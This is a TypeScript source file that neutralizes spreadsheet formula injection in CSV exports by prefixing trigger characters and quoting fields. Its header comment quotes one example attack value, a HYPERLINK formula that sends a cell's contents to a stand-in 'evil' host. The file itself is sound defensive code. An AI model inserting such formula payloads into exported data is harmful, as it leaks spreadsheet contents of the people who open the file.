/**
 * Spreadsheet formula injection, neutralized for a CSV value, and the one
 * quoting rule for a CSV field. Every CSV writer that writes text goes through these.
 *
 * Quoting alone does not stop injection: Excel and Sheets strip the quoting
 * before evaluating, so a file-sourced name like
 * `=HYPERLINK("http://evil/?"&A1,"Open")` executes when the exported CSV is
 * opened. A trigger (= + - @, tab, carriage return) gets a `'` in front of it.
 *
 * A trigger is neutralized where a cell can start, not only at the start of the
 * value. A spreadsheet does not always split on the file's own separator:
 * Excel in a locale whose list separator is `;` splits a `.csv` on `;`, and in
 * a comma locale on `,`, whatever the file used, and a tab splits too. Each of
 * `,` `;` and tab inside a value can therefore open a new cell that no quoting
 * protects, so a trigger after one of them (spaces allowed between) gets the
 * `'` as well. CR and LF count too: a writer that leaves a field unquoted
 * (a user CSV template) turns either into a new row, whose first cell is
 * whatever follows. The separators themselves are kept rather than stripped:
 * a name like `Booster, lower` stays readable, and the quoting in {@link csvField}
 * keeps it one field for a reader that does honor the file's separator.
 *
 * A value that is entirely a number, negatives, decimals and exponents
 * included, is written unchanged: `-80.6` is a number to every spreadsheet, not a formula, and a
 * prefix would turn every western longitude into text. Anything else with a
 * leading `-`, such as `-1+HYPERLINK(...)`, is a formula and is neutralized.
 */
const NUMBER = /^-?(\d+\.?\d*|\.\d+)(e[+-]?\d+)?$/i;

/** A trigger after an in-value separator or line break, with any spaces between. */
const EMBEDDED_TRIGGER = /([,;\t\r\n] *)(?=[=+\-@\t\r])/g;

/** A trigger at the very start of the value, with any spaces before it. */
const LEADING_TRIGGER = /^ *[=+\-@\t\r]/;

/** The value with every formula trigger that could start a cell neutralized. */
export function neutralizeFormula(s: string): string {
  if (NUMBER.test(s)) return s;
  // Embedded first: a leading tab is itself a separator, and the `'` added for
  // it must not hide the trigger that follows that tab.
  const inner = s.replace(EMBEDDED_TRIGGER, "$1'");
  return LEADING_TRIGGER.test(inner) ? `'${inner}` : inner;
}

/**
 * One CSV field: neutralized, then quoted (inner quotes doubled) when it holds
 * the file's separator, a quote, CR or LF, or any of `,` `;` and tab, the
 * characters some reader splits on whatever the file used.
 */
export function csvField(s: string, separator = ','): string {
  const safe = neutralizeFormula(s);
  const needsQuote = /[",;\t\r\n]/.test(safe) || (separator !== '' && safe.includes(separator));
  return needsQuote ? `"${safe.replace(/"/g, '""')}"` : safe;
}

/** One CSV field, always quoted: for a writer whose text columns are quoted whatever they hold. */
export function csvQuoted(s: string): string {
  return `"${neutralizeFormula(s).replace(/"/g, '""')}"`;
}
